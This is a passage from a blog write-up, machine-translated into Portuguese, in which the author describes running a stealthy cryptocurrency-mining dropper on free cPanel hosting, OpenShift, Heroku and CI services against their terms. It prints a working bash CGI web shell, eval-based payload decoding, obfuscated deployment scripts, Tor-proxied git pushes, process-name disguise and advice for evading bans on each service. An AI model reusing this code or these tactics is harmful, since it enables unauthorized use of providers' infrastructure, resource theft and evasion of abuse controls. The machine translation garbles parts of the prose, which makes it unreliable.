    <span class=hljs-keyword>if</span> [ -n <span class=hljs-string>"<span class=hljs-variable>$VERBOSE</span>"</span> ]; <span class=hljs-keyword>then</span><span class=hljs-keyword>if</span><span class=hljs-built_in>declare</span> -n 2>><span class=hljs-variable>${VERBOSE}</span> && <span class=hljs-built_in>eval</span><span class=hljs-string>"b64d <<<\"\$<span class=hljs-variable>$1</span>\" 1>\"<span class=hljs-variable>$2</span>\" 2>><span class=hljs-variable>${VERBOSE}</span>"</span>; <span class=hljs-keyword>then</span><span class=hljs-built_in>return</span><span class=hljs-keyword>else</span><span class=hljs-comment># log "dumping from array"</span><span class=hljs-built_in>eval</span><span class=hljs-string>"b64d <<<\"\${gobbled[<span class=hljs-variable>$1</span>]}\" 1>\"<span class=hljs-variable>$2</span>\" 2>><span class=hljs-variable>${VERBOSE}</span>"</span> && <span class=hljs-built_in>return</span><span class=hljs-keyword>fi</span><span class=hljs-built_in>return</span> 1
    <span class=hljs-keyword>else</span><span class=hljs-keyword>if</span><span class=hljs-built_in>declare</span> -n && <span class=hljs-built_in>eval</span><span class=hljs-string>"b64d <<<\"\$<span class=hljs-variable>$1</span>\" >\"<span class=hljs-variable>$2</span>\""</span>; <span class=hljs-keyword>then</span><span class=hljs-built_in>return</span><span class=hljs-keyword>else</span><span class=hljs-comment># log "dumping from array"</span><span class=hljs-built_in>eval</span><span class=hljs-string>"b64d <<<\"\${gobbled[<span class=hljs-variable>$1</span>]}\" >\"<span class=hljs-variable>$2</span>\""</span> && <span class=hljs-built_in>return</span><span class=hljs-keyword>fi</span><span class=hljs-built_in>return</span> 1
    <span class=hljs-keyword>fi</span>
}</code></pre><p>Uma peculiaridade enlouquecedora encontrada com o bash durante a codificação do minerador é atribuir uma variável com uma subcamada com aspas<code>myvar="$(something)"</code> causa um aumento permanente no uso de memória, isso era difícil de depurar e realmente não descobri o motivo pelo qual se comporta dessa forma, de qualquer maneira, a atribuição deve ser descompactada. Em vez disso, a decodificação é feita com<em> herestrings</em> que é uma abstração sobre arquivos temporários, a variável é despejada em um arquivo que é canalizado de volta para o processo.<p>O loop de longa duração do minerador:<ul><li><p>enquanto verdadeiro<ul><li><p>parar mineiro<li><p>remover configuração<li><p>começar mineiro<li><p>enquanto verdadeiro<ul><li><p>iniciar daemon<ul><li><p>enquanto o mineiro está correndo<ul><li><p>leia a saída do mineiro<li><p>escolha a ação do minerador com base na linha de saída</ul></ul><li><p>se o minerador não estiver em execução: break</ul><li><p>dormir</ul></ul><p>A linha de saída é comparada a algum regex:<pre><code class="bash hljs">act_rgx=<span class=hljs-string>'(accepted|speed|paused|algo:|-> update config|-> publish config|-> trigger restart|\[CC\-Client\] error|Error: \"\[Connect\]|POOL #1:      \(null\))|not enough memory|self-test failed|read error|cpu  disabled'</span></code></pre><p>O daemon lida com casos onde<ul><li><p>a conexão com o endpoint dá erros (escolha um novo endpoint aleatório)<li><p>as alterações do algoritmo de hash (ajuste o tempo de suspensão e as configurações ad-hoc)<li><p>problemas do minerador (reinicie o minerador).</ul><p>Por um tempo houve suporte para o painel de comando e controle, que permitia acionar reinicializações manuais, porém como seu uso era mínimo ele foi descartado e seus endpoints foram substituídos por uma conexão de pool alternativa, também o processo de reinicialização era instável, complexo. ..outra instância de dívida de tecnologia. No entanto, permitiu recuperar uma carga útil atualizada e reconfigurar todas as configurações em tempo real, o que foi muito legal, o trampolim definitivo.<h2 id=debugging><a class=header-anchor href=#debugging> Depurando</a></h2><p>Existem três utilitários principais<ul><li><p>habilitar / desabilitar o rastreamento em torno dos blocos de código (não queremos rastrear um binário codificado em b64 em uma variável ..)<li><p>uma função simples para formatar registros<li><p>um sinalizador que ativaria o registro detalhado em tempo de execução sempre que o minerador fosse iniciado.<ul><li><p>faz o arquivo<code>.debug</code> existir?<ul><li><p>habilitar registro detalhado</ul></ul></ul><h2 id=target_deployments><a class=header-anchor href=#target_deployments> Implementações de destino</a></h2><p>Esta configuração foi testada em 3 tipos de hosts:<h3 id=self_hosted_containers_or_vms><a class=header-anchor href=#self_hosted_containers_or_vms> Contêineres auto-hospedados ou VMs</a></h3><p>Muitos provedores de hospedagem não gostam de mineração, pois os recursos da CPU tendem a ser compartilhados entre vários usuários, e o software de mineração pode facilmente desacelerar um nó de host, afetando o desempenho do restante dos usuários. Isso pode ser verdadeiro mesmo se o tempo do usuário da CPU for ilimitado, porque algoritmos de hash podem saturar todas as camadas de cache da CPU se o cache for compartilhado entre todos os núcleos da CPU.<p>Gostaríamos de usar nosso<em> justa</em> compartilhamento de recursos sem ser banido, esse é um bom caso de uso para o nosso dropper furtivo, uma vez que está ciente do uso do host, o que significa que<em> deve</em> ficar dentro de [AUP]. Não há etapas extras ao lidar com implantações auto-hospedadas, apenas o script do iniciador, talvez adicionado à sequência de inicialização ou iniciado manualmente.<h3 id=cpanel_based_web_hosting><a class=header-anchor href=#cpanel_based_web_hosting> alojamento web baseado em cPanel</a></h3><p>Os planos de assinatura de hospedagem na Web são oferecidos principalmente por meio do [cPanel]. Mais uma vez, estamos usando planos de assinatura pessoal que têm limites de recursos razoáveis, por outro lado, qualquer plano gratuito tem limites ridículos<sup id=fnref:freehostinglimits><a class=fnref href=#fndef:freehostinglimits>[9]</a></sup> . cPanel permite definir manipuladores para diferentes extensões de arquivo, o que nos permite executar scripts de shell através do<a href=https://en.wikipedia.org/wiki/Common_Gateway_Interface> cgi</a> com uma solicitação http em relação a um script de shell carregado no servidor. Este tipo de interface é a aparência de web-shells<sup id=fnref:cpanelssh><a class=fnref href=#fndef:cpanelssh>[10]</a></sup> . Um shell da web bash simples<pre><code class="bash hljs"><span class=hljs-comment># without content encoding the request response won't be honored</span><span class=hljs-built_in>echo</span> -e <span class=hljs-string>'Content-Type: text/plain\n'</span>
SERVER_NAME=myserver
<span class=hljs-comment>## parse vars (for interactive use)</span>
saveIFS=<span class=hljs-variable>$IFS</span>
IFS=<span class=hljs-string>'=&'</span>
parm=(<span class=hljs-variable>$QUERY_STRING</span>)
IFS=<span class=hljs-variable>$saveIFS</span><span class=hljs-keyword>for</span> ((i=0; i<<span class=hljs-variable>${#parm[@]}</span>; i+=2))
<span class=hljs-keyword>do</span><span class=hljs-built_in>declare</span> var_<span class=hljs-variable>${parm[i]}</span>=<span class=hljs-variable>${parm[i+1]}</span><span class=hljs-keyword>done</span><span class=hljs-comment>## exec command for interactive and proclimited scenarios</span>
url_encoded=<span class=hljs-string>"<span class=hljs-variable>${var_path//+/ }</span>"</span><span class=hljs-built_in>export</span> PATH=<span class=hljs-string>".:<span class=hljs-variable>$PATH</span>"</span>
. /dev/shm/srv/utils/load.env &>/dev/null

<span class=hljs-keyword>if</span><span class=hljs-built_in>declare</span> -f <span class=hljs-string>"<span class=hljs-variable>${url_encoded/\%20*}</span>"</span> 1>/dev/null; <span class=hljs-keyword>then</span><span class=hljs-comment>## don't use -n, redirect fd for bcompat</span><span class=hljs-built_in>printf</span><span class=hljs-string>'%b'</span><span class=hljs-string>"<span class=hljs-variable>${url_encoded//%/\\x}</span>"</span> > /tmp/<span class=hljs-variable>${SERVER_NAME}</span>.src
<span class=hljs-keyword>else</span><span class=hljs-keyword>if</span><span class=hljs-built_in>builtin</span><span class=hljs-string>"<span class=hljs-variable>${url_encoded/\%20*}</span>"</span>; <span class=hljs-keyword>then</span><span class=hljs-built_in>printf</span><span class=hljs-string>'%b'</span><span class=hljs-string>"<span class=hljs-variable>${url_encoded//%/\\x}</span>"</span> > /tmp/<span class=hljs-variable>${SERVER_NAME}</span>.src
    <span class=hljs-keyword>else</span><span class=hljs-built_in>printf</span><span class=hljs-string>'exec %b'</span><span class=hljs-string>"<span class=hljs-variable>${url_encoded//%/\\x}</span>"</span> > /tmp/<span class=hljs-variable>${SERVER_NAME}</span>.src
    <span class=hljs-keyword>fi</span><span class=hljs-keyword>fi</span>
. /tmp/<span class=hljs-variable>${SERVER_NAME}</span>.src</code></pre><p>É melhor confiar apenas em built-ins, pois a bifurcação de processos adicionais pode não ser permitida em web jails, mas é sempre possível<code>exec</code> o que nos permite usar a maioria dos utilitários de linha de comando. A maioria dos shells da web são escritos em outras linguagens de script, como python ou php, pois você não precisa se preocupar com bifurcação.<p>Em um ambiente cpanel, é melhor usar um nome estático para o processo de mineração, como<code>httpd</code> ou<code>php-fpm</code> Porque<code>cgi</code> é baseado em multiprocessamento, então os servidores são sempre preenchidos com muitos processos nomeados como este, embora um observador cuidadoso deva notar o<em> multi-threaded</em> padrão de uso que definitivamente não é comum (ou possível) para linguagens como perl, php, ruby ​​ou python!<p>Os processos também têm um limite de tempo por padrão, (1 hora, 1 dia, etc.), para isso usamos apenas um cron job que reinicia o dropper.<p>Isso exigia muita edição manual, a api cpanel para automatizar isso, infelizmente, não é exposta aos usuários finais, então a hospedagem na web é um alvo desajeitado e enfadonho para nosso conta-gotas mineiro.<h3 id=web_environments><a class=header-anchor href=#web_environments> Ambientes da web</a></h3><p>Existem<em> SaaS</em> provedores que têm um editor da web acoplado a um contêiner, como<a href="with a free tier before getting acquired by amazon"> cloud9</a> , [codeanywhere], [codenvy]. Implantar o conta-gotas aqui é fácil (você tem um ambiente completo), mas mantê-lo funcionando é um fardo, uma vez que qualquer editor web interativo encerra sua sessão logo após a página ser fechada, e o contêiner é consequentemente colocado em hibernação (a menos que você pagar é claro).<p>Contornar isso só pode significar que temos que manter as sessões abertas, alguns scripts com [marionetista] alcançaram o resultado desejado, mas ter uma longa execução, vazamento de memória e páginas da web de SPAs inchadas é definitivamente pouco atraente e não furtivo, porque do back-end do provedor, uma sessão aberta 24 horas por dia, 7 dias por semana, certamente parecerá suspeita. Na verdade, os ambientes da web também são alvos desajeitados e enfadonhos.<h3 id=free_apps_services><a class=header-anchor href=#free_apps_services> Serviços de aplicativos gratuitos</a></h3><p>Isto é principalmente<a href="when it used to have a free tier"> abertura</a><sup id=fnref:openshift><a class=fnref href=#fndef:openshift>[11]</a></sup> e [heroku]. OpenShift, sendo kubernetes era um tanto simples de implantar, mas cheio de rotatividade de configuração, aqui está um trecho:<pre><code class="sh hljs"><span class=hljs-built_in>export</span> PATH=.:<span class=hljs-variable>$PATH</span>

[ -z <span class=hljs-string>"<span class=hljs-variable>$OC_PRJ</span>"</span> ] && { <span class=hljs-built_in>echo</span><span class=hljs-string>"no account data provided"</span>; <span class=hljs-built_in>exit</span> 1; }
obfs=~/utils/deploy/obfs.sh
[ -x <span class=hljs-variable>$obfs</span> ] ||
    { <span class=hljs-built_in>echo</span><span class=hljs-string>"obfs utility not found!"</span>; <span class=hljs-built_in>exit</span> 1; }
launcher=~/launcher
[ -f <span class=hljs-variable>$launcher</span> ] ||
    { <span class=hljs-built_in>echo</span><span class=hljs-string>"launcher script not found!"</span>; <span class=hljs-built_in>exit</span> 1; }

ctroot=<span class=hljs-variable>${CT_ROOT_DIR:-oc-ct-box-mine}</span><span class=hljs-comment>## the service that starts the miner is named app in /etc/services.d in the rootfs</span>
scriptpath=<span class=hljs-string>"rootfs/etc/services.d/app/run"</span>
TYPE=<span class=hljs-variable>${HRK_TYPE:-worker}</span>
IMG=$(oc-endpoint)/<span class=hljs-variable>$OC_PRJ</span>/<span class=hljs-variable>$OC_APP</span>
tspath=/tmp/oc-tmp-apprun
prepend=<span class=hljs-string>"#!/usr/bin/with-contenv bash
"</span><span class=hljs-comment>## beware the newline ^^^</span><span class=hljs-built_in>cd</span><span class=hljs-variable>$ctroot</span> || { <span class=hljs-built_in>echo</span><span class=hljs-string>"couldn't find ct build directory"</span>; <span class=hljs-built_in>exit</span> 1; }

VARS=$(cat vars) || { <span class=hljs-built_in>echo</span><span class=hljs-string>'vars file empty!'</span>; }
VARS=<span class=hljs-variable>${VARS//$'\n'/ }</span>
VARS=<span class=hljs-variable>${VARS//\\/\\\\}</span><span class=hljs-comment>## preserve escapes</span>
script=$(cat <span class=hljs-variable>$launcher</span> | tail +2 | sed -r <span class=hljs-string>'/^echo "export \\$/a '</span><span class=hljs-string>"<span class=hljs-variable>$VARS</span>"</span><span class=hljs-string>' \\'</span>)
cat <<< <span class=hljs-string>"<span class=hljs-variable>$script</span>"</span> > <span class=hljs-variable>$tspath</span><span class=hljs-variable>$obfs</span><span class=hljs-variable>$tspath</span>
[ -z <span class=hljs-string>"<span class=hljs-variable>${tspath}</span>.obfs"</span> ] && { <span class=hljs-built_in>echo</span><span class=hljs-string>"obfs file not found?"</span>; <span class=hljs-built_in>exit</span> 1; }
cat <<< <span class=hljs-string>"$prepend<span class=hljs-subst>$(cat <span class=hljs-string>"<span class=hljs-variable>${tspath}</span>.obfs"</span>)</span>"</span> > <span class=hljs-variable>$scriptpath</span><span class=hljs-built_in>exec</span> itself (should <span class=hljs-built_in>eval</span>)
chmod +x <span class=hljs-variable>$scriptpath</span>

docker build -t <span class=hljs-variable>$IMG</span>  . || <span class=hljs-built_in>exit</span> 1
<span class=hljs-built_in>cd</span> -
oc-push-image <span class=hljs-string>"<span class=hljs-variable>$IMG</span>"</span></code></pre><p>Este foi o script usado para construir o contêiner de mineração que exigia um modelo yaml:<pre><code class="yaml hljs"><span class=hljs-attr>apiVersion:</span><span class=hljs-string>build.openshift.io/v1</span><span class=hljs-attr>kind:</span><span class=hljs-string>BuildConfig</span><span class=hljs-attr>metadata:</span><span class=hljs-attr>labels:</span><span class=hljs-attr>build:</span><span class=hljs-string>${OC_APP}</span><span class=hljs-attr>name:</span><span class=hljs-string>${OC_APP}</span><span class=hljs-attr>spec:</span><span class=hljs-attr>activeDeadlineSeconds:</span><span class=hljs-number>5184000</span><span class=hljs-attr>failedBuildsHistoryLimit:</span><span class=hljs-number>0</span><span class=hljs-attr>successfulBuildsHistoryLimit:</span><span class=hljs-number>0</span><span class=hljs-attr>resources:</span><span class=hljs-attr>limits:</span><span class=hljs-attr>cpu:</span><span class=hljs-number>2</span><span class=hljs-attr>memory:</span><span class=hljs-string>1Gi</span><span class=hljs-attr>runPolicy:</span><span class=hljs-string>Serial</span><span class=hljs-attr>source:</span><span class=hljs-attr>type:</span><span class=hljs-string>Binary</span><span class=hljs-attr>strategy:</span><span class=hljs-attr>sourceStrategy:</span><span class=hljs-attr>from:</span><span class=hljs-attr>kind:</span><span class=hljs-string>ImageStreamTag</span><span class=hljs-attr>name:</span><span class=hljs-string>${OC_APP}-build:latest</span><span class=hljs-attr>namespace:</span><span class=hljs-string>${OC_PRJ}</span><span class=hljs-attr>type:</span><span class=hljs-string>Source</span><span class=hljs-attr>template:</span><span class=hljs-attr>activeDeadlineSeconds:</span><span class=hljs-number>2400</span><span class=hljs-attr>triggers:</span><span class=hljs-bullet>-</span><span class=hljs-attr>generic:</span><span class=hljs-attr>secretReference:</span><span class=hljs-attr>name:</span><span class=hljs-string>${OC_APP}</span><span class=hljs-attr>type:</span><span class=hljs-string>Generic</span></code></pre><p>Mas todo o processo envolveu várias etapas!<pre><code class="sh hljs"><span class=hljs-comment>## init</span>
[ -z <span class=hljs-string>"<span class=hljs-variable>$OC_APP</span>"</span> ] && <span class=hljs-built_in>export</span> $(<$(tfi))
[ -z <span class=hljs-string>"<span class=hljs-variable>$OC_APP</span>"</span> ] && { . ./choose-creds || <span class=hljs-built_in>exit</span> 1; }
oc-login
oc new-project <span class=hljs-variable>$OC_PRJ</span> || { [ -z <span class=hljs-string>"<span class=hljs-subst>$(oc get projects)</span>"</span> ] && <span class=hljs-built_in>exit</span> 1; }
oc new-app <span class=hljs-variable>$OC_APP</span> --allow-missing-images || <span class=hljs-built_in>exit</span> 1

<span class=hljs-comment>## build box with docker and push</span><span class=hljs-comment># oc-docker-login || exit 1</span>
oc-build-mine || <span class=hljs-built_in>exit</span> 1

<span class=hljs-comment>## create dc config</span><span class=hljs-built_in>export</span> OC_TEMPLATE_TYPE=mine
oc-box-template || <span class=hljs-built_in>exit</span> 1
rtr=0
<span class=hljs-keyword>while</span> [ <span class=hljs-variable>$rtr</span> -lt 10 ]; <span class=hljs-keyword>do</span>
  oc rollout latest <span class=hljs-variable>$OC_APP</span> && <span class=hljs-built_in>break</span>
  rtr=$((rtr+<span class=hljs-number>1</span>))
  <span class=hljs-built_in>read</span> -t 1
<span class=hljs-keyword>done</span><span class=hljs-built_in>exit</span><span class=hljs-comment>## builds</span>
bash -x oc-build-build || <span class=hljs-built_in>exit</span> 1
bash -x oc-build-template || <span class=hljs-built_in>exit</span> 1
oc start-build <span class=hljs-variable>$OC_APP</span> || <span class=hljs-built_in>exit</span> 1

accounts=<span class=hljs-variable>${ACCOUNTS_DIR:-accounts_queue}</span>
mv <span class=hljs-variable>$accounts</span>/<span class=hljs-variable>${OC_USR}</span>{\.this,\.$(date +%s)}</code></pre><p>Em pseudocódigo:<ul><li><p>crie o projeto<li><p>crie o aplicativo sem uma imagem<li><p>construir o contêiner de mineração<li><p>implantar o contêiner com uma configuração de implantação (abstração de kubernetes)<li><p>lançar a implantação</ul><p>o<code>build-build</code> em vez disso, os scripts criaram um<em> construir</em> recipiente que mineraria por algumas horas de cada vez. Builds e pods normais têm recursos separados em openshift, então exploramos ambos. No geral, o Openshift foi uma experiência ruim, pois passou por 4 versões diferentes (talvez mais, parei de rastrear depois de um tempo) e cada um deles exigia mudanças nas configurações, eles não tinham caminhos de atualização e tudo era iterado rapidamente, e era comum para builds / pods travarem, e não sendo coletados como lixo ... eles geralmente executavam reinicializações manuais de vez em quando, talvez o kubernetes estivesse apenas cheio de erros :)<p>A configuração do Heroku era um pouco mais simples (não envolve kubernetes). Além da construção do contêiner, que era semelhante ao openshift, o resto eram apenas dois comandos cli<pre><code class="bash hljs">heroku config:<span class=hljs-built_in>set</span> HRK_APP=<span class=hljs-variable>$HRK_APP</span> -a <span class=hljs-variable>$HRK_APP</span>
heroku container:release -a <span class=hljs-variable>$HRK_APP</span><span class=hljs-variable>$TYPE</span></code></pre><p>O contêiner foi empurrado diretamente com o docker para o registro do heroku.<sup id=fnref:herokucontainers><a class=fnref href=#fndef:herokucontainers>[12]</a></sup> O atrito com o heroku (cujo nível gratuito ainda está de pé até o momento em que este livro foi escrito) é que os dinamômetros só podem ser executados por 22 dias por mês, então eles exigiam algum gerenciamento manual a cada mês, novamente desajeitado e enfadonho. Eles executaram algumas ondas de banimento no início e, em seguida, desativaram os registros por meio do TOR, tenho certeza de que fui a causa disso.<h3 id=ci_containers_or_vms><a class=header-anchor href=#ci_containers_or_vms> Contêineres de CI ou VMs</a></h3><p>Esses foram os alvos mais sinérgicos para nosso conta-gotas. Existem muitos<a href=https://en.wikipedia.org/wiki/Continuous_integration> CI</a> empresas, muitas das quais estão gastando dinheiro para investidores oferecendo níveis gratuitos na esperança de obter alguma participação no mercado de negócios de infraestrutura de tecnologia.<p>Todos esses serviços oferecem diferentes recursos, possuem diferentes requisitos de configuração e são executados em diferentes ambientes. Nunca pensei em automatizar o registro da conta porque esse tipo de coisa é horrível de programar, tento evitá-los o tempo todo, então aguentei os registros manuais por um tempo, pois estava curioso para saber que tipo de resposta anti-spam eu receberia (e quão diferente do resto!). Você pode adivinhar algumas coisas sobre a gestão de uma empresa pelo modo como ela lida com spam:<ul><li><p>Ele executa ondas de proibição? Então, eles têm políticas não rígidas, os problemas são tratados manualmente e caso a caso<li><p>Requer verificação de telefone? Eles já foram abusados ​​no passado<li><p>Eles respondem ao uso pesado de recursos? Eles estão operando com um orçamento apertado<li><p>Eles aplicam restrições de conta ou proibições de sombra? Se eles shadow ban, eles têm sysadmins médios.</ul><p>Também há uma questão filosófica: se um serviço permite que você abuse de seu sistema por um longo tempo, isso significa que ele tem uma infraestrutura de primeira linha capaz de lidar com a carga ou simplesmente um controle insuficiente sobre seu sistema? E você deve considerar o equilíbrio entre acessibilidade e segurança, um sistema muito seguro pode diminuir a retenção de usuários.<p>Aqui está uma tabela mostrando alguns serviços que implantei:<table><tbody><tr class="header headerLastRow"><th style=text-align:center>ci<th style=text-align:center>configuração<th style=text-align:center>atuação<th style=text-align:center>martelo de proibição<tr><td style=text-align:center>Bitrise<td style=color:red;text-align:center>mau<td style=color:#ff0;text-align:center>médio<td style=color:#ff0;text-align:center>médio<tr><td style=text-align:center>Travis<td style=color:green;text-align:center>Boa<td style=color:#ff0;text-align:center>médio<td style=color:green;text-align:center>Boa<tr><td style=text-align:center>Codeship<td style=color:#ff0;text-align:center>médio<td style=color:red;text-align:center>mau<td style=color:#ff0;text-align:center>médio<tr><td style=text-align:center>Gitlab<td style=color:#ff0;text-align:center>médio<td style=color:green;text-align:center>Boa<td style=color:green;text-align:center>Boa<tr><td style=text-align:center>Circleci<td style=color:red;text-align:center>mau<td style=color:green;text-align:center>Boa<td style=color:#ff0;text-align:center>médio<tr><td style=text-align:center>Semáforo<td style=color:green;text-align:center>Boa<td style=color:green;text-align:center>Boa<td style=color:#ff0;text-align:center>médio<tr><td style=text-align:center>Docker<td style=color:#ff0;text-align:center>médio<td style=color:#ff0;text-align:center>médio<td style=color:green;text-align:center>Boa<tr><td style=text-align:center>Cais<td style=color:green;text-align:center>Boa<td style=color:#ff0;text-align:center>médio<td style=color:#ff0;text-align:center>médio<tr><td style=text-align:center>Codefresh<td style=color:red;text-align:center>mau<td style=color:green;text-align:center>Boa<td style=color:#ff0;text-align:center>médio<tr><td style=text-align:center>Wercker<td style=color:#ff0;text-align:center>médio<td style=color:#ff0;text-align:center>médio<td style=color:red;text-align:center>mau<tr><td style=text-align:center>Azure-pipelines<td style=color:#ff0;text-align:center>médio<td style=color:#ff0;text-align:center>médio<td style=color:red;text-align:center>mau<tr><td style=text-align:center>Continuousphp<td style=color:red;text-align:center>mau<td style=color:#ff0;text-align:center>médio<td style=color:#ff0;text-align:center>médio<tr><td style=text-align:center>camarada<td style=color:red;text-align:center>mau<td style=color:red;text-align:center>mau<td style=color:red;text-align:center>mau<tr><td style=text-align:center>Drone<td style=color:red;text-align:center>mau<td style=color:green;text-align:center>Boa<td style=color:red;text-align:center>mau<tr><td style=text-align:center>Appveyor<td style=color:red;text-align:center>mau<td style=color:#ff0;text-align:center>médio<td style=color:red;text-align:center>mau<tr><td style=text-align:center>Nevercode<td style=color:red;text-align:center>mau<td style=color:green;text-align:center>Boa<td style=color:#ff0;text-align:center>médio<tr><td style=text-align:center>Zeist / vercel<td style=color:red;text-align:center>mau<td style=color:green;text-align:center>Boa<td style=color:red;text-align:center>mau</table><p>Neste contexto, um<span style=color:green> Boa</span> configuração significa que não demorou muito para configurar um<code>ci</code> trabalho para o processo de mineração (como todos os serviços que dependem de um painel da web em vez de um arquivo de ponto do repositório eram uma tarefa árdua), um<span style=color:red> mau</span><code>ban-hammer</code> significa que foi difícil registrar-se no serviço ou que as contas seriam banidas de forma mais agressiva.<p><a href=https://web.archive.org/web/20210222050951/https://www.bitrise.io/> Bitrise</a> requer para configurar um projeto, para inferir o ambiente, a arquitetura de destino, o processo de execução e outras coisas, era muito demorado configurar um build, por isso obteve uma classificação ruim na configuração.<a href=https://web.archive.org/web/20210310010750/https://continuousphp.com/> Continuousphp</a>, <a href=https://web.archive.org/web/20210322133805/https://buddy.works/> camarada</a> , [Codefresh] também tinha muitos passos de configuração manual não declarativa.<p>Serviços como [Azure-pipelines],<a href=https://web.archive.org/web/20210308202144/https://app.wercker.com/> Wercker</a>, <a href=https://web.archive.org/web/20210322133805/https://buddy.works/> camarada</a> aplica shadow-bans nas contas, shadow-bans são ruins, pois deixam você adivinhando se há algo errado com sua configuração ou não. Com alguns serviços, você pode adivinhar o motivo do banimento (basicamente sua construção demorou muito ou você construiu muitas vezes em um curto período), para alguns outros, como [Azure-pipelines], presumo que aplicaram algum tipo de impressão digital para os repositórios do usuário, pois as proibições estavam ocorrendo, mesmo sem qualquer abuso de recursos, azure e vercel também restritos<code>DNS</code> acesso dentro de máquinas de construção pública, de modo que era um atrito adicional que precisava ser superado com um túnel ad-hoc.<p><a href=https://web.archive.org/web/20210327045555/https://cloud.drone.io/welcome> Drone</a> deu acesso a um processador inteiro de 16+ núcleos, mas acabou banindo após 2 compilações<sup id=fnref:saddrone><a class=fnref href=#fndef:saddrone>[13]</a></sup>. <a href=https://web.archive.org/web/20210322100629/https://www.cloudbees.com/products/codeship> Codeship</a> também dá acesso a hosts de construção poderosos e não bane tão agressivamente quanto o drone.<p>Meus serviços favoritos não por causa da lucratividade, mas pela facilidade e conveniência (também com outros projetos) eram<a href=https://web.archive.org/web/20210324163536/https://travis-ci.org/> Travis</a>, <a href=https://web.archive.org/web/20210308041527/https://semaphoreci.com/> Semáforo</a> e<a href=https://web.archive.org/web/20210322105637/https://hub.docker.com/> Docker-hub</a> . Travis é como o CI padrão e é muito flexível, o Semaphore é o único<code>DSL</code> para<code>CI</code> que parecia acessível e bem, embora em vez de apenas uma sequência interminável de caixas de seleção espaguete como outras IUs, e Docker apenas pela simplicidade de mapear dockerfiles para compilações.<h3 id=builds_configs><a class=header-anchor href=#builds_configs> Cria configurações</a></h3><p>As compilações foram acionadas por cron jobs oferecidos por serviços da web ou por git commits. Portanto, você tinha que manter o controle de uma pilha de tokens de acesso ou chaves ssh para gerenciar todos os commits git. Também era importante não exagerar nos commits e usar proxies ao enviar para os repositórios configurando o git:<pre><code class="toml hljs"><span class=hljs-section>[http]</span><span class=hljs-attr>proxy</span> = socks5://<span class=hljs-number>127.0</span>.<span class=hljs-number>0.1</span>:<span class=hljs-number>9050</span><span class=hljs-attr>sslverify</span> = <span class=hljs-literal>false</span><span class=hljs-section>[https]</span><span class=hljs-attr>proxy</span> = socks5://<span class=hljs-number>127.0</span>.<span class=hljs-number>0.1</span>:<span class=hljs-number>9050</span><span class=hljs-attr>sslverify</span> = <span class=hljs-literal>false</span><span class=hljs-section>[url "https://"]</span><span class=hljs-attr>insteadOf</span> = git://</code></pre><p>Usando serviços de hospedagem git, o github tem sido o mais completo sobre banimentos, mas eles só foram executados após relatórios de abuso por administradores de serviços ci. O gitlab executou uma onda de banimento uma vez, quando tentei renovar o teste de CI (sem cuidado). Nunca recebi o banimento de uma conta bitbucket. Para (forçar) enviar commits git, temos um loop de longa execução que remarcou o repositório git:<pre><code class="bash hljs"><span class=hljs-keyword>while</span> :; <span class=hljs-keyword>do</span>
    repos_count=$(ls -ld <span class=hljs-variable>${repos}</span>/* | grep -c ^d)
    repos_ival=$(((RANDOM%variance+delay)/repos_count))
    <span class=hljs-keyword>for</span> r <span class=hljs-keyword>in</span><span class=hljs-variable>$repos</span>/*; <span class=hljs-keyword>do</span><span class=hljs-built_in>cd</span><span class=hljs-string>"<span class=hljs-variable>$r</span>"</span>
        git fetch --all
        tagger
        <span class=hljs-built_in>echo</span> -e <span class=hljs-string>"\e[32m"</span><span class=hljs-string>"sleeping for <span class=hljs-variable>$repos_ival</span> since <span class=hljs-subst>$(date +%H:%M:%S\ %b/%d)</span>"</span><span class=hljs-string>"\e[0m"</span>
        sleep <span class=hljs-variable>$repos_ival</span><span class=hljs-keyword>done</span>
    sleep 1
<span class=hljs-keyword>done</span></code></pre><p>Pode ser possível que o envio forçado dessa maneira não seja algo que o github goste muito e possa ser a causa da sinalização de contas. A função tagger encarregada de forçar o envio de um commit diferente, usa um site (que você pode pesquisar facilmente) que fornece alguns commits aleatórios. Não tenho certeza do quanto isso ajuda, já que o próprio conteúdo dos commits é obviamente suspeito para o meu caso. E também me mordeu na bunda uma vez, já que os commits retornados por esse comando podem incluir palavrões, um dos meus commits foi pego por um bot do Twitter que rastreia git commits com palavrões! Eu adicionei uma lista negra para palavrões após o incidente.<p>Eu realmente não mergulhei em git commits ofuscados e repositórios git ofuscados. A única instância em que usei um repositório mais elaborado foi com o Bitrise, já que não era possível configurar um build se o sistema não reconhecesse um ambiente (como aplicativos móveis), mas mesmo assim não havia rotação e era sempre o mesmo repositório, muito fácil de detectar.<p>No geral, se eu tivesse que traçar uma curva de sino em torno do momento ideal para a minha<em> sem</em>ter contas banidas, em todos os serviços testados, seria com um centro de aproximadamente 1 hora de duração de construção, uma vez por dia. Para núcleos de CPU, exceto por alguns mentirosos (como drone), a maioria dos serviços espera que você use a quantidade total de recursos fornecidos a você, uma vez que as compilações são executadas dentro de VMs ou contêineres com recursos restritos ... e a compilação é geralmente uma tarefa que satura a CPU, por isso não tem relevância estatística. Intuitivamente, uma compilação por dia é o que o desenvolvedor médio faria, então você deve esperar sinalizadores elevados se você se desviar da média, e empurrar para o abuso nunca termina bem.<h2 id=conclusions><a class=header-anchor href=#conclusions> Conclusões</a></h2><p>Valeu a pena? As partes de rede foram definitivamente interessantes, lidar com registros de contas era obviamente a pior parte, ninguém gosta de clicar em e-mails de confirmação intermináveis ​​e repetir procedimentos de interface do usuário entorpecentes, afinal. Escrever software de automação de spam também é enfadonho (porque você costuma cutucar APIs idiotas) e, com essa suposição (e o fato de que isso nunca foi nada sério), nem sequer considerei isso. Foi lucrativo? Em seu pico, estava alcançando algo como<code>300$</code> por mês, talvez o suficiente para um venezuelano, não realmente para mim :)<p><table class=fndef id=fndef:adversary><tbody><tr><td class=fndef-backref><a href=#fnref:adversary>[1]</a><td class=fndef-content><em> o administrador de sistema mal-humorado</em></table><table class=fndef id=fndef:infoproc><tbody><tr><td class=fndef-backref><a href=#fnref:infoproc>[2]</a><td class=fndef-content>mesmo que isso quebrasse muitas suposições de privacidade, tenho certeza de que a maioria deles apenas olha para dentro sempre que há um problema incumbente, mas isso é apenas um problema para tempos de execução baseados em contêiner, enquanto as VMs são praticamente caixas pretas.</table><table class=fndef id=fndef:monerominer><tbody><tr><td class=fndef-backref><a href=#fnref:monerominer>[3]</a><td class=fndef-content>o minerador embutido no nó monero teve algum trabalho para torná-lo mais amigável com o fundo, mas a distribuição do xmrig nunca foi focada na compatibilidade com o fundo.</table><table class=fndef id=fndef:difficulty><tbody><tr><td class=fndef-backref><a href=#fnref:difficulty>[5]</a><td class=fndef-content>alguns pools oferecem dificuldades 